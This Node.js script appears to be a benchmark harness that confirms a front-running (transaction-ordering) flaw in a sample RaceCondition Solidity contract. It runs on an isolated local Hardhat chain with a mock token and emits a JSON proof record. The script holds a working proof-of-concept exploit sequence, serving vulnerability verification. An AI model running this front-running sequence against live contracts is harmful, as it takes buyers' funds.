'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const TOKEN_SOURCE = `pragma solidity ^0.4.16;
contract RaceMockToken {
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    function mint(address to, uint amount) public { balanceOf[to] += amount; }
    function approve(address spender, uint amount) public returns (bool) {
        allowance[msg.sender][spender] = amount; return true;
    }
    function transfer(address to, uint amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount);
        balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true;
    }
    function transferFrom(address from, address to, uint amount) public returns (bool) {
        require(balanceOf[from] >= amount && allowance[from][msg.sender] >= amount);
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount; balanceOf[to] += amount; return true;
    }
}`;

function digest(bytes) { return crypto.createHash('sha256').update(bytes).digest('hex'); }

function compile(sourceName, source) {
  const input = { language: 'Solidity', sources: {
    [sourceName]: { content: source }, 'RaceMockToken.sol': { content: TOKEN_SOURCE },
  }, settings: { optimizer: { enabled: false }, outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } } };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  return output.contracts;
}

function artifact(contracts, sourceName, contractName) {
  const item = contracts?.[sourceName]?.[contractName];
  if (!item?.abi || !item?.evm?.bytecode?.object) throw new Error(`artifact_missing:${sourceName}:${contractName}`);
  return item;
}

async function deploy(signer, item, args = []) {
  const contract = await new ContractFactory(item.abi, item.evm.bytecode.object, signer).deploy(...args);
  const receipt = await contract.deploymentTransaction().wait();
  if (receipt.status !== 1) throw new Error('deployment_failed');
  await contract.waitForDeployment();
  return { contract, receipt };
}

async function expectRevert(transactionPromise) {
  try {
    const receipt = await (await transactionPromise).wait();
    return Number(receipt.status) === 0;
  } catch (error) {
    return Number(error.receipt?.status ?? error.info?.receipt?.status ?? 0) === 0;
  }
}

(async () => {
  const sourcePath = path.resolve(process.argv[2] || '');
  const sourceBytes = fs.readFileSync(sourcePath);
  const source = sourceBytes.toString('utf8');
  const sourceSha256 = digest(sourceBytes);
  const expectedSha256 = process.env.TRAINING_SOURCE_SHA256 || '';
  if (!/^[a-f0-9]{64}$/.test(expectedSha256) || sourceSha256 !== expectedSha256) {
    throw new Error('training_race_source_hash_mismatch');
  }
  if (String(process.env.BENCHMARK_SOLC_VERSION || '').split('+', 1)[0] !== '0.4.26'
      || !String(solc.version()).startsWith('0.4.26+')) {
    throw new Error('training_race_requires_exact_solc_0.4.26');
  }
  const compilerArtifactSha256 = String(process.env.BENCHMARK_SOLC_SHA256 || '').replace(/^0x/, '');
  if (!/^[a-f0-9]{64}$/i.test(compilerArtifactSha256)) throw new Error('training_race_compiler_hash_missing');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('training_race_requires_isolated_local_evm');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) {
    throw new Error('training_race_evm_not_isolated');
  }

  const sourceName = path.basename(sourcePath);
  const contracts = compile(sourceName, source);
  const raceArtifact = artifact(contracts, sourceName, 'RaceCondition');
  const tokenArtifact = artifact(contracts, 'RaceMockToken.sol', 'RaceMockToken');
  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('training_race_chain_id_mismatch');
  const owner = await provider.getSigner(0);
  const buyer = await provider.getSigner(1);
  const ownerAddress = (await owner.getAddress()).toLowerCase();
  const buyerAddress = (await buyer.getAddress()).toLowerCase();
  const tokenDeployment = await deploy(owner, tokenArtifact);
  const token = tokenDeployment.contract;
  const tokenAddress = await token.getAddress();
  const tokenAmount = 100n;
  const purchaseBudget = 200n;
  const originalPrice = 100n;
  const frontRunPrice = 200n;
  const tokenSeed = 1000n;
  const targets = [];
  const transactions = [{ name: 'deploy_test_token', status: tokenDeployment.receipt.status,
    hash: tokenDeployment.receipt.hash }];

  for (const sequence of ['buy_first', 'price_change_first']) {
    const raceDeployment = await deploy(owner, raceArtifact, [originalPrice, tokenAddress]);
    const race = raceDeployment.contract;
    const raceAddress = await race.getAddress();
    transactions.push({ name: `deploy_${sequence}_target`, status: raceDeployment.receipt.status,
      hash: raceDeployment.receipt.hash });
    const mintReceipt = await (await token.getFunction('mint')(buyerAddress, tokenSeed)).wait();
    const approveReceipt = await (await token.connect(buyer).getFunction('approve')(raceAddress, tokenSeed)).wait();
    transactions.push({ name: `mint_${sequence}_buyer_tokens`, status: mintReceipt.status, hash: mintReceipt.hash });
    transactions.push({ name: `approve_${sequence}_token_spend`, status: approveReceipt.status,
      hash: approveReceipt.hash });
    const ownerBefore = await token.getFunction('balanceOf')(ownerAddress);
    const buyerBefore = await token.getFunction('balanceOf')(buyerAddress);
    let changeReceipt = null;
    if (sequence === 'price_change_first') {
      changeReceipt = await (await race.connect(owner).getFunction('changePrice')(frontRunPrice, { gasLimit: 300000 })).wait();
      transactions.push({ name: 'front_run_change_price', status: changeReceipt.status, hash: changeReceipt.hash });
    }
    const buyReceipt = await (await race.connect(buyer).getFunction('buy')(originalPrice, {
      value: purchaseBudget, gasLimit: 500000,
    })).wait();
    transactions.push({ name: `buyer_buy_${sequence}`, status: buyReceipt.status, hash: buyReceipt.hash });
    const ownerAfter = await token.getFunction('balanceOf')(ownerAddress);
    const buyerAfter = await token.getFunction('balanceOf')(buyerAddress);
    const contractBalance = await provider.getBalance(raceAddress);
    const currentOwner = `0x${(await provider.send('eth_getStorageAt', [raceAddress, '0x0', 'latest'])).slice(-40)}`.toLowerCase();
    const currentPrice = BigInt(await provider.send('eth_getStorageAt', [raceAddress, '0x1', 'latest']));
    let staleOwnerChangeReverted = null;
    if (sequence === 'buy_first') {
      staleOwnerChangeReverted = await expectRevert(
        race.connect(owner).getFunction('changePrice')(frontRunPrice, { gasLimit: 300000 }),
      );
    }
    targets.push({
      sequence, race, raceAddress,
      result: {
        sequence, tokenTransferToOwner: (ownerAfter - ownerBefore).toString(),
        tokenLossByBuyer: (buyerBefore - buyerAfter).toString(),
        contractEthBalanceWei: contractBalance.toString(), currentOwner,
        currentPrice: currentPrice.toString(), purchaseBudgetWei: purchaseBudget.toString(),
        buyBlock: Number(buyReceipt.blockNumber),
        changePriceBlock: changeReceipt ? Number(changeReceipt.blockNumber) : null,
        staleOwnerChangeReverted,
      },
    });
  }

  const baseline = targets.find((target) => target.sequence === 'buy_first').result;
  const frontRun = targets.find((target) => target.sequence === 'price_change_first').result;
  const victimCostIncreased = BigInt(frontRun.tokenLossByBuyer) - BigInt(baseline.tokenLossByBuyer);
  const orderingProven = baseline.currentOwner === buyerAddress && baseline.currentPrice === originalPrice.toString()
    && baseline.staleOwnerChangeReverted === true
    && frontRun.changePriceBlock < frontRun.buyBlock
    && frontRun.currentOwner === buyerAddress && frontRun.currentPrice === originalPrice.toString();
  const assetImpactProven = baseline.tokenLossByBuyer === originalPrice.toString()
    && frontRun.tokenLossByBuyer === frontRunPrice.toString()
    && baseline.tokenTransferToOwner === originalPrice.toString()
    && frontRun.tokenTransferToOwner === frontRunPrice.toString()
    && victimCostIncreased === originalPrice
    && baseline.contractEthBalanceWei === purchaseBudget.toString()
    && frontRun.contractEthBalanceWei === purchaseBudget.toString();
  const assertions = [
    { name: 'owner_price_change_mined_before_buy_in_same_fixed_budget', passed: orderingProven },
    { name: 'front_run_increases_buyer_token_loss_and_owner_receipt', passed: assetImpactProven },
  ];
  const confirmed = assertions.every((assertion) => assertion.passed);
  const result = {
    schemaVersion: 1, sampleId: 'crytic-race-condition',
    state: confirmed ? 'confirmed' : 'unconfirmed', confirmedVulnerability: confirmed,
    vulnerability: 'transaction_ordering_price_front_run',
    proofScope: 'In an isolated local EVM with the source-bound RaceCondition and a test ERC20, owner.changePrice mined before a buyer buy using the same ETH budget increases the buyer token debit from 100 to 200 and the prior owner token receipt by 100. A buy-first control transfers 100 and causes the former owner price change to revert. This demonstrates source-specific ordering-dependent asset movement; it does not estimate a live deployment or market impact.',
    mode: 'isolated_in_process', compilerVersion: solc.version(), compilerArtifactSha256,
    compilerKind: 'solc-js-original-source', sourceSha256,
    parameters: { originalPrice: originalPrice.toString(), frontRunPrice: frontRunPrice.toString(),
      purchaseBudgetWei: purchaseBudget.toString(), tokenSeed: tokenSeed.toString() },
    sequences: { buyFirst: baseline, priceChangeFirst: frontRun },
    victimAdditionalTokenLoss: victimCostIncreased.toString(), transactions, assertions,
    executionBoundary: publicBoundary(fork, { chainId, forkState: 'not_performed' }),
    reason: confirmed ? null : 'ordering_or_token_asset_assertion_failed',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 2;
});
